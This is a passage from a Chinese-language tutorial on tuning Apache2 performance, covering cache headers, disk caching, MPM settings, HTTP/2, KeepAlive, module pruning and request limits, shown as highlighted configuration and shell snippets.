<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/svg+xml</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/x-icon</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 字体</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> font/woff &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> font/woff2 &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/font-woff</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/font-woff2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 视频和音频</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> video/mp4</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> audio/mpeg</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 为静态资源添加缓存控制</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.(js|css|xml|gz|html)$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> append Cache-Control &quot;public&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.(jpg|jpeg|png|gif|swf|ico|svg)$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Cache-Control &quot;max-age=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">31536000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, public&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 移除ETag（可选）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> unset</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ETag</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    FileETag</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 磁盘缓存配置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_cache_disk.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/cache/apache2/mod_cache_disk</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheEnable</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> disk /</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheDirLevels</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheDirLength</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheMaxFileSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1000000</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheMinFileSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CacheDefaultExpire</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 3600</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>创建缓存目录：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/cache/apache2/mod_cache_disk</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chown</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -R</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www-data:www-data</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/cache/apache2/mod_cache_disk</span></span></code></pre></figure>
<h3 id="3-优化mpm多处理模块">3. 优化MPM（多处理模块）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-优化mpm多处理模块" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看当前使用的MPM</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 可用的MPM模块</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - prefork: 多进程，每个进程一个线程（兼容性最好）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - worker: 多进程多线程</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># - event: 类似worker，性能更好（推荐）</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 切换到event MPM（推荐用于高性能）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_prefork</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_event</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<p><strong>Event MPM配置优化：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/mods-available/mpm_event.conf</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_event_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      # 启动时的进程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">     # 最小空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          75</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">     # 最大空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadLimit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">              64</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">     # 每个子进程的最大线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">     # 每个子进程的线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    # 最大并发请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      # 子进程处理的最大请求数（</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=无限）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>Prefork MPM配置（如果使用）：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_prefork_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          10</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   0</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="4-启用http2">4. 启用HTTP/2<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-启用http2" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用HTTP/2模块（需要SSL）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在SSL虚拟主机中启用</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/default-ssl.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 添加以下行</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Protocols</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> h2</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http/1.1</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试HTTP/2</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --http2</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://localhost</span></span></code></pre></figure>
<h3 id="5-keepalive优化">5. KeepAlive优化<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-keepalive优化" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/apache2.conf</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用持久连接</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAlive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 持久连接的最大请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxKeepAliveRequests</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 持久连接超时时间（秒）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span></span></code></pre></figure>
<h3 id="6-禁用不必要的模块">6. 禁用不必要的模块<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-禁用不必要的模块" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看已启用的模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用不需要的模块以减少内存占用</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> autoindex</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> negotiation</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h3 id="7-资源限制配置">7. 资源限制配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-资源限制配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在apache2.conf中配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Timeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 300</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxKeepAliveRequests</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求大小</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestBody</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10485760</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFields</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFieldSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestLine</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求速率（需要mod_ratelimit）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_ratelimit.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /downloads</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SetOutputFilter</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> RATE_LIMIT</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SetEnv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> rate-limit </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">400</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h2 id="九故障排查">九、故障排查<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#九故障排查" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
